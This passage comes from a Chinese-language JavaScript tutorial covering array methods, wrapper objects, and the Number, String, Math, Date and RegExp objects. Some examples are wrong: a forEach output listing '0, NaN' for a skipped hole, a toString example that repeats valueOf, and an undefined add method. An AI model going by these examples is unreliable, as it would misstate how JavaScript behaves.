1];b.splice(1, 0, 2) // []b // [1, 2, 1, 1]// 如果只提供第一个参数，等同于将原数组在指定位置拆分成两个数组。var c = [1, 2, 3, 4];c.splice(2) // [3, 4]c // [1, 2] sort() 方法对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。 123456789101112131415161718arr.sort([compareFunction])// sort方法不是按照大小排序，而是按照字典顺序。也就是说，数值会被先转成字符串，再按照字符串Unicode码点进行比较['d', 'c', 'b', 'a'].sort() // ['a', 'b', 'c', 'd'][8, 7, 9].sort() // [7, 8, 9][10111, 1101, 111].sort() // [10111, 1101, 111]// 如果让sort方法按照自定义方式排序，可以传入一个函数作为参数。接受两个参数，表示进行比较的两个数组成员。// 如果返回值小于 0 ，那么 a 会被排列到 b 之前；// 如果返回值等于 0 ，那么 a 和 b 的相对位置不变；// 如果返回值大于 0 ，那么 b 会被排列到 a 之前。// 要比较数字而非字符串，比较函数可以简单的以 a和b相减。a-b升序，b-a降序。[8, 7, 9].sort(function (a, b) &#123; //a-b升序，b-a降序 return a - b;&#125;)// [7, 8, 9] map() 方法将数组的所有成员依次传入参数函数，然后把每一次的执行结果组成一个新数组返回，原数组没有变化。 123456789101112131415161718192021var new_arr = array.map(function(currentValue, index, arr), thisValue)// map方法接受一个函数作为参数，创建一个新数组。该函数调用时，map方法向它传入三个参数：当前成员currentValue、当前位置index和数组本身arr。 // 此外还可以接受第二个参数thisValue用来绑定回调函数内部的this。如果省略了 thisValue，或者传入 null、undefined，那么回调函数的 this 为全局对象。var arr = [1, 2, 3];arr.map(function (ele) &#123; return ele + 1;&#125;);// [2, 3, 4]arr // [1, 2, 3]// 下面代码通过map方法的第二个参数，将回调函数内部的this对象，指向arr数组。var arr2 = ['a', 'b', 'c'];[1, 2].map(function (e) &#123; return this[e];&#125;, arr2)// ['b', 'c']// 如果数组有空位，map方法的回调函数在这个位置不会执行，会跳过数组的空位。map方法不会跳过undefined和null，但是会跳过空位。var f = function (n) &#123; return 'a' &#125;;[1,undefined, null,,2].map(f) // ["a", "a", "a", empty, "a"] forEach() 方法 对数组的所有成员依次执行参数函数。和map很相似， 123456789101112131415161718array.forEach(function(currentValue, index, arr), thisValue)// 但是，forEach方法不像 map() 或者 reduce()，它总是返回undefined值，只用来操作数据，并且不可链式调用(在一个链的最后执行副作用)。这就是说，如果数组遍历的目的是为了得到返回值，那么使用map方法，否则使用forEach方法。['a', 'b', 'c'].forEach(function(ele) &#123; console.log(ele);&#125;);// a b c// forEach方法也可以接受第二个参数，绑定参数函数的this变量。注意，如果使用箭头函数，thisArg 参数会被忽略，因为箭头函数在词法上绑定了 this 值。// forEach方法也不会跳过undefined和null，但是会跳过空位。var out = [];[1, 2, ,3].forEach(function(elem) &#123; this.push(elem * elem);&#125;, out);out // (5) [1, 4, 0, NaN, 9] 注意索引2被跳过了，因为在数组的这个位置是空位// 注意，forEach方法无法中断执行或跳出循环，总是会将所有成员遍历完，除了抛出一个异常。若你需要提前终止循环，你可以使用for、for...of、every、some、find、findIndex，他们可以对数组元素判断，以便确定是否需要继续遍历。或者也可以使用 filter() 提前过滤出需要遍历的部分，再用 forEach() 处理。 filter() 方法用于过滤数组成员，满足条件的成员组成一个新数组返回。如果没有通过测试则返回空数组。 12345678910111213141516171819202122var new_array = array.filter(function(currentValue, index, arr), thisArg])// 它的参数是一个函数，所有数组成员依次执行该函数，返回结果为true的成员组成一个新数组返回。该方法不会改变原数组。[1, 2, 3, 4, 5].filter(function (ele) &#123; return (ele &gt; 3);&#125;)// [4, 5]// filter方法的参数函数可以接受三个参数：当前成员，当前位置和整个数组。[1, 2, 3, 4, 5].filter(function (ele, index, arr) &#123; return index % 2 === 0;&#125;);// [1, 3, 5]// filter方法还可以接受第二个参数，用来绑定参数函数内部的this变量。var obj = &#123; MAX: 3 &#125;;var myFilter = function (item) &#123; if (item &gt; this.MAX) return true; // 过滤器myFilter内部有this变量，它可以被filter方法的第二个参数obj绑定&#125;;var arr = [2, 8, 3, 4, 1, 3, 2, 9];arr.filter(myFilter, obj) // [8, 4, 9] some()、every()这两个方法类似“断言”（assert），返回一个布尔值，表示判断数组成员是否符合某种条件。被调用时不会改变数组。它们接受一个函数作为参数，所有数组成员依次执行该函数。该函数接受三个参数：当前成员、当前位置和整个数组，然后返回一个布尔值。some方法是只要一个成员的返回值是true，则整个some方法的返回值就是true，否则返回false。every方法是所有成员的返回值都是true，整个every方法才返回true，否则返回false。 12345678910111213141516171819202122232425262728// 语法array.some(function(currentValue, index, arr), thisArg)// 示例var arr = [1, 2, 3, 4, 5];arr.some(function (elem, index, arr) &#123; return elem &gt;= 3;&#125;);// true// 使用箭头函数测试数组元素的值 更简洁[2, 5, 8, 1, 4].some(x =&gt; x &gt; 10); // false// 判断数组元素中是否存在某个值var fruits = ['apple', 'banana', 'mango', 'guava'];function checkAvailability(arr, val) &#123; return arr.some(function(arrVal) &#123; return val === arrVal; &#125;);&#125;checkAvailability(fruits, 'banana'); // true// 注意，对于空数组，some方法返回false，every方法返回true，回调函数都不会执行。function isEven(x) &#123; return x % 2 === 0 &#125;[].some(isEven) // false[].every(isEven) // true reduce()、reduceRight() 依次处理数组的每个成员，最终累计为一个值。它们的差别是，reduce是从左到右处理（从第一个成员到最后一个成员），reduceRight则是从右到左（从最后一个成员到第一个成员），其他完全一样。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// reduce为数组中的每一个元素依次执行callback函数，不包括数组中被删除或从未被赋值的元素，对于空数组是不会执行回调函数的。接受四个参数：array.reduce(function(accumulator, currentValue, currentIndex, arr), initialValue)// 求数组里所有值的和var sum = [1, 2, 3, 4, 5].reduce(function (acc, cur) &#123; console.log(acc, cur); return acc + cur;&#125;, 0)// 1 2// 3 3// 6 4// 10 5// 15 最后结果// 可以写成箭头函数的形式var total = [ 1, 2, 3, 4, 5 ].reduce(( acc, cur ) =&gt; acc + cur, 0); // 15// 注意：如果没有提供initialValue，reduce 会从索引1的地方开始执行 callback 方法，跳过第一个索引。如果提供initialValue，从索引0开始。// 如果数组为空且没有提供initialValue，会抛出TypeError 。如果数组仅有一个元素（无论位置如何）并且没有提供initialValue， 或者有提供initialValue但是数组为空，那么此唯一值将被返回并且callback不会被执行。// 因此，提供初始值通常更安全。// 下面是一个reduceRight方法的例子。function subtract(prev, cur) &#123; return prev - cur;&#125;[3, 2, 1].reduce(subtract) // 0 reduce方法相当于3减去2再减去1[3, 2, 1].reduceRight(subtract) // -4 reduceRight方法相当于1减去2再减去3// 由于这两个方法会遍历数组，所以实际上还可以用来做一些遍历相关的操作。比如，找出字符长度最长的数组成员。function findLongest(entries) &#123; return entries.reduce(function (longest, entry) &#123; return entry.length &gt; longest.length ? entry : longest; &#125;, '');&#125;findLongest(['aaa', 'bb', 'c']) // "aaa"// 将二维数组转化为一维var flattened = [[0, 1], [2, 3], [4, 5]].reduce(function(a, b) &#123; return a.concat(b);&#125;,[]);// 数组去重let arr = [1,2,1,2,3,5,4,5,3,4,4];let result = arr.sort().reduce((init, current)=&gt;&#123; if(init.length===0 || init[init.length-1]!==current)&#123; init.push(current); &#125; return init;&#125;, []);result //[1,2,3,4,5]// 计算数组中每个元素出现的次数var names = ['Alice', 'Bob', 'Tiff', 'Bruce', 'Alice'];var countedNames = names.reduce(function (allNames, name) &#123; if (name in allNames) &#123; allNames[name]++; &#125; else &#123; allNames[name] = 1; &#125; return allNames;&#125;, &#123;&#125;);countedNames // &#123; 'Alice': 2, 'Bob': 1, 'Tiff': 1, 'Bruce': 1 &#125; indexOf()，lastIndexOf()indexOf方法返回给定元素在数组中第一次出现的位置，如果没有出现则返回-1。 123456789101112131415var a = ['a', 'b', 'c'];a.indexOf('b') // 1a.indexOf('y') // -1// indexOf方法还可以接受第二个参数，表示搜索的开始位置。['a', 'b', 'c'].indexOf('a', 1) // -1// lastIndexOf方法返回给定元素在数组中最后一次出现的位置，如果没有出现则返回-1。var a = [2, 5, 9, 2];a.lastIndexOf(2) // 3a.lastIndexOf(7) // -1// 注意，这两个方法不能用来搜索NaN的位置，即它们无法确定数组成员是否包含NaN。这是因为这两个方法内部，使用严格相等运算符（===）进行比较，而NaN是唯一一个不等于自身的值。[NaN].indexOf(NaN) // -1[NaN].lastIndexOf(NaN) // -1 链式使用上面这些数组方法之中，有不少返回的还是数组，所以可以链式使用。 12345678910111213141516var users = [ &#123;name: 'tom', email: 'tom@example.com'&#125;, &#123;name: 'peter', email: 'peter@example.com'&#125;];users .map(function (user) &#123; return user.email; &#125;) .filter(function (email) &#123; return /^t/.test(email); &#125;) .forEach(function (email) &#123; console.log(email); &#125;);// "tom@example.com" 包装对象对象是 JavaScript 语言最主要的数据类型，三种原始类型的值——数值、字符串、布尔值——在一定条件下，也会自动转为对象，也就是原始类型的“包装对象”。 包装对象所谓“包装对象”，就是分别与数值、字符串、布尔值相对应的Number、String、Boolean三个原生对象。这三个原生对象可以把原始类型的值变成（包装成）对象。 1234567891011121314151617// 下面代码中，基于原始类型的值，生成了三个对应的包装对象。var v1 = new Number(123); // Number &#123;123&#125;var v2 = new String('abc'); // String &#123;"abc"&#125;var v3 = new Boolean(true); // Boolean &#123;true&#125;typeof v1 // "object"typeof v2 // "object"typeof v3 // "object"// 包装对象的最大目的，首先是使得 JavaScript 的对象涵盖所有的值，其次使得原始类型的值可以方便地调用某些方法。// Number、String和Boolean如果不作为构造函数调用（即调用时不加new），常常用于将任意类型的值转为数值、字符串和布尔值。Number(123) // 123String('abc') // "abc"Boolean(true) // true// 总结一下，这三个对象作为构造函数使用（带有new）时，可以将原始类型的值转为对象；作为普通函数使用时（不带有new），可将任意类型的值，转为原始类型的值。 实例方法三种包装对象各自提供了许多实例方法。这里介绍两种它们共同具有、从Object对象继承的方法：valueOf和toString。 123456789101112131415161718// valueOf方法返回包装对象实例对应的原始类型的值。new Number(123).valueOf() // 123new String('abc').valueOf() // "abc"new Boolean(true).valueOf() // true// toString方法返回对应的字符串形式。new Number(123).valueOf() // 123new String('abc').valueOf() // "abc"new Boolean(true).valueOf() // true// 对于一些特殊值，如null、undefined、false， Boolean对象前面加不加new，会得到完全相反的结果，必须小心。if (Boolean(false)) &#123; // false console.log('true'); // 无输出&#125; if (new Boolean(false)) &#123; // Boolean &#123;false&#125; console.log('true'); // true&#125; 原始类型与实例对象的自动转换原始类型的值，可以自动当作包装对象调用，即调用包装对象的属性和方法。这时，JavaScript 引擎会自动将原始类型的值转为包装对象实例，在使用后立刻销毁实例。 123456789101112131415// 比如，字符串可以调用length属性，返回字符串的长度。var str = 'abc';str.length // 3// 等同于var strObj = new String(str)strObj.length // 3strObj // String &#123;0: "a", 1: "b", 2: "c", length: 3, [[PrimitiveValue]]: "abc"&#125;// abc是一个字符串，本身不是对象，不能调用length属性。JavaScript 引擎自动将其转为包装对象，在这个对象上调用length属性。调用结束后，这个临时对象就会被销毁。这就叫原始类型与实例对象的自动转换。// 自动转换生成的包装对象是只读的，无法修改。所以，字符串无法添加新属性。var s = 'Hello World';s.x = 123;s.x // undefined 为字符串s添加了一个x属性，结果无效，总是返回undefined。// 另一方面，调用结束后，包装对象实例会自动销毁。这意味着，下一次调用字符串的属性时，实际是调用一个新生成的对象，而不是上一次调用时生成的那个对象，所以取不到赋值在上一个对象的属性。如果要为字符串添加属性，只有在它的原型对象String.prototype上定义。 自定义方法除了原生的实例方法，包装对象还可以自定义方法和属性，供原始类型的值直接调用。 1234567// 比如，我们可以新增一个double方法，使得字符串和数字翻倍。String.prototype.double = function () &#123; return this.valueOf() + this.valueOf();&#125;;'abc'.double() // abcabc// 但是，这种自定义方法和属性的机制，只能定义在包装对象的原型上，如果直接对原始类型的变量添加属性，则无效。 Number 对象Number对象是数值对应的包装对象，可以作为构造函数使用，也可以作为工具函数使用。 包装对象 和 工具函数 1234// 作为构造函数时，它用于生成值为数值的对象。var n = new Number(1); // Number &#123;1&#125;// 作为工具函数时，它可以将任何类型的值转为数值。Number(true) // 1 静态属性Number对象拥有以下一些静态属性（即直接定义在Number对象上的属性，而不是定义在实例上的属性）。 123456Number.POSITIVE_INFINITY：正的无限，指向Infinity。Number.NEGATIVE_INFINITY：负的无限，指向-Infinity。Number.NaN：表示非数值，指向NaN。Number.MIN_VALUE：表示最小的正数（即最接近0的正数，在64位浮点数体系中为5e-324），相应的，最接近0的负数为-Number.MIN_VALUE。Number.MAX_SAFE_INTEGER：表示能够精确表示的最大整数，即9007199254740991。Number.MIN_SAFE_INTEGER：表示能够精确表示的最小整数，即-9007199254740991。 实例方法Number对象有4个实例方法，都跟将数值转换成指定格式有关。 12345678910111213141516171819202122232425262728293031Number.prototype.toString() 将一个数值转为字符串形式。// toString方法可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串。// toString方法只能将十进制的数，转为其他进制的字符串。如果要将其他进制的数，转回十进制，需要使用parseInt方法。(10).toString() // "10"(10).toString(2) // "1010"(10).toString(8) // "12"(10).toString(16) // "a"// 通过方括号运算符也可以调用toString方法。10['toString'](2) // "1010"Number.prototype.toFixed() 将一个数转为指定位数的小数，然后返回这个小数对应的字符串// 参数为小数位数，有效范围为0到20，超出这个范围将抛出 RangeError 错误(10).toFixed(2) // "10.00"10.005.toFixed(2) // "10.01"Number.prototype.toExponential() 将一个数转为科学计数法形式// 参数是小数点后有效数字的位数，范围为0到20，超出这个范围，会抛出一个 RangeError 错误(10).toExponential() // "1e+1"(10).toExponential(1) // "1.0e+1"Number.prototype.toPrecision() 将一个数转为指定位数的有效数字// 参数为有效数字的位数，范围是1到21，超出这个范围会抛出 RangeError 错误(12.34).toPrecision(1) // "1e+1"(12.34).toPrecision(2) // "12"(12.34).toPrecision(3) // "12.3"// toPrecision方法用于四舍五入时不太可靠，跟浮点数不是精确储存有关。(12.15).toPrecision(3) // "12.2"(12.45).toPrecision(3) // "12.4" 自定义方法与其他对象一样，Number.prototype对象上面可以自定义方法，被Number的实例继承。 1234567891011// 由于add方法返回的还是数值，所以可以链式运算Number.prototype.subtract = function (x) &#123; return this - x;&#125;;(8).add(2).subtract(4) // 6// 注意，数值的自定义方法，只能定义在它的原型对象Number.prototype上面，数值本身是无法自定义属性的。var n = 1;n.x = 1;n.x // undefined// 上面代码中，n是一个原始类型的数值。直接在它上面新增一个属性x，不会报错，但毫无作用，总是返回undefined。这是因为一旦被调用属性，n就自动转为Number的实例对象，调用结束后，该对象自动销毁。所以，下一次调用n的属性时，实际取到的是另一个对象，属性x当然就读不出来。 String 对象String对象是 JavaScript 原生提供的三个包装对象之一，用来生成字符串对象。12345678910111213var s1 = 'abc';var s2 = new String('abc'); // String &#123;"abc"&#125;typeof s1 // "string"typeof s2 // "object"s2.valueOf() // "abc" 返回的就是它所对应的原始字符串// 字符串对象是一个类似数组的对象（很像数组，但不是数组）。有数值键（0、1、2）和length属性，所以可以像数组那样取值。new String('abc') // String &#123;0: "a", 1: "b", 2: "c", length: 3&#125;(new String('abc'))[1] // "b"// 除了用作构造函数，String对象还可以当作工具方法使用，将任意类型的值转为字符串。String(true) // "true"String(5) // "5" 静态方法 (即定义在对象本身，而不是定义在对象实例的方法）String.fromCharCode() 该方法的参数是一个或多个数值，代表 Unicode 码点，返回值是这些码点组成的字符串。 12345String.fromCharCode() // "" 参数为空，就返回空字符串String.fromCharCode(97) // "a" 否则，返回参数对应的 Unicode 字符串。String.fromCharCode(104, 101, 108, 108, 111) // "hello"// 注意，该方法不支持 Unicode 码点大于0xFFFF的字符，即传入的参数不能大于0xFFFF（即十进制的 65535）。因码点大于0xFFFF的字符占用四个字节，而 JavaScript 默认支持两个字节的字符。这种情况下，必须拆成两个字符表示。 实例属性String.prototype.length 字符串实例的length属性返回字符串的长度。 如’abc’.length // 3 实例方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980str.charAt() 返回指定位置的字符，参数是从0开始编号的位置var s = new String('abc');s.charAt(1) // "b"// 这个方法完全可以用数组下标替代。'abc'[1] // "b"// 如果参数为负数，或大于等于字符串的长度，charAt返回空字符串。'abc'.charAt(-1) // ""str.charCodeAt() 方法返回字符串指定位置的 Unicode 码点（十进制表示），相当于String.fromCharCode()的逆操作'abc'.charCodeAt(1) // 98// 如果没有任何参数，charCodeAt返回首字符的 Unicode 码点。如果参数为负数，或大于等于字符串的长度，charCodeAt返回NaN。str.concat() 用于连接两个字符串，返回一个新字符串，不改变原字符串。可以接受多个参数。如果参数不是字符串，concat方法会将其先转为字符串，然后再连接。'a'.concat('b', 'c') // "abc"// 作为对比，加号运算符在两个运算数都是数值时，不会转换类型''.concat(1, 2, 3) // "123"1 + 2 + 3 // 6str.slice(start,end) 从原字符串取出子字符串并返回，不改变原字符串。它的第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含）'JavaScript'.slice(0, 4) // "Java"str.substring(start,stop)从原字符串取出子字符串并返回，不改变原字符串。第一个参数表示子字符串的开始位置，第二个位置表示结束位置（不含）。不建议使用。'JavaScript'.substring(0, 4) // "Java"// 如果第一个参数大于第二个参数，substring方法会自动更换两个参数的位置。 如果参数是负数，substring方法会自动将负数转为0。'JavaScript'.substring(4, -3) // "Java"str.substr(start,length) 从原字符串取出子字符串并返回，不改变原字符串，跟slice和substring方法的作用相同。第一个参数是子字符串的开始位置（从0开始），第二个参数是子字符串的长度。如果省略第二个参数，则表示子字符串一直到原字符串的结束。'JavaScript'.substr(4, 6) // "Script"// 如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。'JavaScript'.substr(-6) // "Script"'JavaScript'.substr(4, -1) // ""str.indexOf() indexOf方法用于确定一个字符串在另一个字符串中第一次出现的位置，返回结果是匹配开始的位置。如果返回-1，就表示不匹配。indexOf方法还可以接受第二个参数，表示从该位置开始向后匹配。str.lastIndexOf() lastIndexOf方法的用法跟indexOf方法一致，主要的区别是lastIndexOf从尾部开始匹配，indexOf则是从头部开始匹配。第二个参数表示从该位置起向前匹配。str.trim() trim方法用于去除字符串两端的空格，返回一个新字符串，不改变原字符串。// 该方法去除的不仅是空格，还包括制表符（\t、\v）、换行符（\n）和回车符（\r）。' hello world '.trim() // "hello world"'\r\nabc \t'.trim() // 'abc'str.toLowerCase() 将一个字符串全部转为小写。返回一个新字符串，不改变原字符串str.toUpperCase() 将一个字符串全部转为大写。返回一个新字符串，不改变原字符串str.match(regexp) 用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回null。'cat, bat, sat, fat'.match('at') // ["at"]'cat, bat, sat, fat'.match('xt') // null// 返回的数组还有index属性和input属性，分别表示匹配字符串开始的位置和原始字符串。var matches = 'cat, bat, sat, fat'.match('at');matches.index // 1matches.input // "cat, bat, sat, fat"str.search(regexp) 用法基本等同于match，但是返回值为匹配的第一个位置。如果没有找到匹配，则返回-1。'cat, bat, sat, fat'.search('at') // 1str.replace(regexp, replacement) 用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有g修饰符的正则表达式）'aaa'.replace('a', 'b') // "baa"str.split(separator, limit) 用指定的分隔符分割成字符串数组，以将字符串分隔为子字符串，以确定每个拆分的位置'a|b|c'.split('|') // ["a", "b", "c"]// 如果分割规则为空字符串，则返回数组的成员是原字符串的每一个字符。与 Array.join() 执行的操作相反。'a|b|c'.split('') // ["a", "|", "b", "|", "c"] // 如果省略参数，则返回数组的唯一成员就是原字符串。'a|b|c'.split() // ["a|b|c"]// 如果满足分割规则的两个部分紧邻着（即两个分割符中间没有其他字符），则返回数组之中会有一个空字符串。'a||c'.split('|') // ['a', '', 'c']// split方法还可以接受第二个参数，限定返回数组的最大成员数。'a|b|c'.split('|', 2) // ["a", "b"] Math 对象Math是 JavaScript 的原生对象，提供各种数学功能。该对象不是构造函数，不能生成实例，所有的属性和方法都必须在Math对象上调用。 静态属性Math对象的静态属性，提供以下一些数学常数。这些属性都是只读的，不能修改。 12345678Math.E：常数e。 // 2.718281828459045Math.LN2：2 的自然对数。 // 0.6931471805599453Math.LN10：10 的自然对数。 // 2.302585092994046Math.LOG2E：以 2 为底的e的对数。 // 1.4426950408889634Math.LOG10E：以 10 为底的e的对数。 // 0.4342944819032518Math.PI：常数π。 // 3.141592653589793Math.SQRT1_2：0.5 的平方根。 // 0.7071067811865476Math.SQRT2：2 的平方根。 // 1.4142135623730951 静态方法Math对象提供以下一些静态方法。 12345678910111213141516171819202122232425262728293031323334Math.abs()：绝对值Math.ceil()：向上取整，大于参数值的最小整数（天花板值）Math.floor()：向下取整，小于参数值的最大整数（地板值）// 实现一个总是返回数值的整数部分的函数function ToInteger(x) &#123; x = Number(x); return x &lt; 0 ? Math.ceil(x) : Math.floor(x);&#125;Math.max()：最大值 // 如果参数为空, 返回-InfinityMath.min()：最小值 // 如果参数为空, 返回InfinityMath.pow()：指数运算。以第一个参数为底数、第二个参数为幂的指数值// Math.pow(2, 3) // 8 等同于 2 ** 3Math.sqrt()：平方根。如果参数是一个负值，则返回NaNMath.log()：自然对数Math.exp()：e的指数。返回常数e的参数次方Math.round()：四舍五入。// 注意，它对负数的处理（主要是对0.5的处理）。// Math.round(-1.1) // -1// Math.round(-1.5) // -1// Math.round(-1.6) // -2Math.random()：伪随机数，[0, 1)之间// 任意范围的随机数生成函数如下。function getRandomArbitrary(min, max) &#123; return Math.random() * (max - min) + min;&#125;// 任意范围的随机整数生成函数如下。function getRandomInt(min, max) &#123; return Math.floor(Math.random() * (max - min + 1)) + min;&#125; 三角函数方法 123456Math.sin()：返回参数的正弦（参数为弧度值）Math.cos()：返回参数的余弦（参数为弧度值）Math.tan()：返回参数的正切（参数为弧度值）Math.asin()：返回参数的反正弦（返回值为弧度值）Math.acos()：返回参数的反余弦（返回值为弧度值）Math.atan()：返回参数的反正切（返回值为弧度值 Date 对象Date对象是 JavaScript 原生的时间库。它以国际标准时间（UTC）1970年1月1日00:00:00作为时间的零点，可以表示的时间范围是前后各1亿天（单位为毫秒）。 普通函数的用法 123// 注意，即使带有参数，Date作为普通函数使用时，返回的还是当前时间。Date() // "Mon Mar 04 2019 23:24:09 GMT+0800 (China Standard Time)"Date(2019, 3, 4) // 返回结果一样，参数不生效 构造函数的用法Date还可以当作构造函数使用。对它使用new命令，会返回一个Date对象的实例。如果不加参数，实例代表的就是当前时间。 1234567891011121314151617181920212223242526272829var today = new Date();// Date实例有一个独特的地方。其他对象求值的时候，都是默认调用.valueOf()方法，但是Date实例求值的时候，默认调用的是toString()方法。// 这导致对Date实例求值，返回的是一个字符串，代表该实例对应的时间。var today = new Date();today // Mon Mar 04 2019 23:27:51 GMT+0800 (China Standard Time)// 等同于today.toString() // 作为构造函数时，Date对象可以接受多种格式的参数，返回一个该参数对应的时间实例。// 参数为时间零点开始计算的毫秒数new Date(1551713492442) // Mon Mar 04 2019 23:31:32 GMT+0800 (China Standard Time)// 参数为日期字符串new Date('Mar 4, 2019');// 参数为多个整数。 代表年、月、日、小时、分钟、秒、毫秒new Date(2019, 2, 4, 0, 0, 0, 0)// 参数可以是负数，表示从基准日扣去相应的时间。// 只要是能被Date.parse()方法解析的字符串，都可以当作参数。// 参数为年、月、日等多个整数时，年和月是不能省略的，其他参数都可以省略的。因为如果只使用“年”这一个参数，Date会将其解释为毫秒数。// 各个参数的取值范围如下，// 年：使用四位数年份，比如2000。如果写成两位数或个位数，则加上1900，即10代表1910年。如果是负数，表示公元前。// 月：0表示一月，依次类推，11表示12月。// 日：1到31。// 小时：0到23。// 分钟：0到59。// 秒：0到59// 毫秒：0到999// 注意，月份从0开始计算，但是，天数从1开始计算。另外，除了日期的默认值为1，小时、分钟、秒钟和毫秒的默认值都是0。// 这些参数如果超出了正常范围，会被自动折算。比如，日期设为0，就代表上个月的最后一天；如果月设为15，就折算为下一年的4月。 日期的运算类型自动转换时，Date实例如果转为数值，则等于对应的毫秒数；如果转为字符串，则等于对应的日期字符串。所以，两个日期实例对象进行减法运算时，返回的是它们间隔的毫秒数；进行加法运算时，返回的是两个字符串连接而成的新字符串。 1234var d1 = new Date(2019, 2, 4); // 表示2019.3.4var d2 = new Date(2019, 2, 5); // 表示2019.3.5d2 - d1 // 86400000d2 + d1 // "Tue Mar 05 2019 00:00:00 GMT+0800 (China Standard Time)Mon Mar 04 2019 00:00:00 GMT+0800 (China Standard Time)" 静态方法 12345678910111213141516171819Date.now() 方法返回当前时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数，相当于 Unix 时间戳乘以1000。Date.now() // 1551747545162Date.parse() 方法用来解析日期字符串，返回该时间距离时间零点（1970年1月1日 00:00:00）的毫秒数。// 日期字符串应该符合 RFC 2822 和 ISO 8061 这两个标准，即YYYY-MM-DDTHH:mm:ss.sssZ格式，其中最后的Z表示时区。但是，其他格式也可以被解析Date.parse('2019-03-05T09:41:00') // 1551750060000Date.parse('Mon, 05 Mar 2019 09:41:00 GMT')// 如果解析失败，返回NaN。Date.parse('xxx') // NaNDate.UTC() 方法接受年、月、日等变量作为参数，返回该时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数。// 该方法的参数用法与Date构造函数完全一致，比如月从0开始计算，日期从1开始计算。// 区别在于Date.UTC方法的参数，会被解释为 UTC 时间（世界标准时间），Date构造函数的参数会被解释为当前时区的时间。// 格式Date.UTC(year, month[, date[, hrs[, min[, sec[, ms]]]]])// 用法Date.UTC(2019, 2, 5, 9, 45, 0, 567) // 1551779100567 实例方法Date的实例对象，有几十个自己的方法，除了valueOf和toString，可以分为以下三类。to类：从Date对象返回一个字符串，表示指定的时间。get类：获取Date对象的日期和时间。set类：设置Date对象的日期和时间。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859valueOf() 方法返回实例对象距离时间零点（1970年1月1日00:00:00 UTC）对应的毫秒数，该方法等同于getTime方法。// 预期为数值的场合，Date实例会自动调用该方法var d = new Date();d.valueOf() // 1551750690389d.getTime() // 1551750690389toString() 方法返回一个完整的日期字符串。// 因为toString是默认的调用方法，所以如果直接读取Date实例，就相当于调用这个方法。var d = new Date(2019, 2, 5);d.toString() // "Tue Mar 05 2019 00:00:00 GMT+0800 (China Standard Time)"toUTCString() 方法返回对应的 UTC 时间，也就是比北京时间晚8个小时。toISOString() 方法返回对应时间的 ISO8601 写法。UTC 时区的时间。new Date(2019, 2, 5).toISOString() // "2019-03-05T02:02:36.471Z"toJSON() 返回一个符合 JSON 格式的 ISO 日期字符串，与toISOString方法的返回结果完全相同toDateString() 方法返回日期字符串（不含小时、分和秒）toTimeString() 方法返回时间字符串（不含年月日）。toLocaleString([locales[, options]]) 完整的本地时间。 locales是一个指定所用语言的字符串，options是一个配置对象toLocaleDateString()：本地日期（不含小时、分和秒）toLocaleTimeString()：本地时间（不含年月日）new Date().toLocaleTimeString('en-US', &#123; hour12: false // "10:12:57"&#125;) // 下面这些get*方法返回的都是当前时区的时间，Date对象还提供了这些方法对应的 UTC 版本，用来返回 UTC 时间。 如getUTCDate()getTime()：返回实例距离1970年1月1日00:00:00的毫秒数，等同于valueOf方法。getDate()：返回实例对象对应每个月的几号（从1开始）。getDay()：返回星期几，星期日为0，星期一为1，以此类推。getFullYear()：返回四位的年份。getMonth()：返回月份（0表示1月，11表示12月）。getHours()：返回小时（0-23）。getMilliseconds()：返回毫秒（0-999）。getMinutes()：返回分钟（0-59）。getSeconds()：返回秒（0-59）。// 这些方法基本是跟get*方法一一对应的，但是没有setDay方法，因为星期几是计算出来的，而不是设置的。另外，需要注意的是，凡是涉及到设置月份，都是从0开始算的，即0是1月，11是12月。// set*方法的参数都会自动折算。以setDate为例，如果参数超过当月的最大天数，则向下一个月顺延，如果参数是负数，表示从上个月的最后一天开始减去的天数。// set*系列方法除了setTime()，都有对应的 UTC 版本，即设置 UTC 时区的时间。setDate(date)：设置实例对象对应的每个月的几号（1-31），返回改变后毫秒时间戳。setFullYear(year [, month, date])：设置四位年份。setHours(hour [, min, sec, ms])：设置小时（0-23）。setMilliseconds()：设置毫秒（0-999）。setMinutes(min [, sec, ms])：设置分钟（0-59）。setMonth(month [, date])：设置月份（0-11）。setSeconds(sec [, ms])：设置秒（0-59）。setTime(milliseconds)：设置毫秒时间戳// set类方法和get类方法，可以结合使用，得到相对时间。var d = new Date();// 将日期向后推10天d.setDate(d.getDate() + 10); RegExp 对象RegExp对象提供正则表示式的功能。JavaScript 的正则表达式体系是参照 Perl 5 建立的。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// 新建正则表达式有两种方法。var regex = /xyz/i; // 字面量，以斜杠表示开始和结束。在引擎编译代码时，就会新建正则表达式。效率较高，比较便利和直观// 等价于var regex = new RegExp('xyz', 'i'); // RegExp构造函数。在运行时新建正则表达式// 实例属性修饰符相关: ignoreCase; global; multiline// 实例属性修饰符无关: lastIndex 下一次开始搜索的位置。可读写，只在进行连续搜索时有意义; source返回正则表达式的字符串形式（不包括反斜杠），该属性只读// 实例方法 RegExp.prototype.test() 和 RegExp.prototype.exec()test() 返回一个布尔值，表示当前模式是否能匹配参数字符串/cat/.test('cats and dogs') // trueexec() 返回匹配结果。如果发现匹配，就返回一个数组，成员是匹配成功的子字符串，否则返回null/x/.exec('_x_x') // ["x"]// 字符串的实例方法，有4种与正则表达式有关，String.prototype.match()等。match()：字符串的match方法与正则对象的exec方法非常类似：匹配成功返回一个数组，匹配失败返回null。如果正则表达式带有g修饰符，则该方法与正则对象的exec方法行为不同，会一次性返回所有匹配成功的结果。'_x_x'.match(/x/) // ["x"] search()：返回第一个满足条件的匹配结果在整个字符串中的位置。如果没有任何匹配，则返回-1'_x_x'.search(/x/) // 1replace(search, 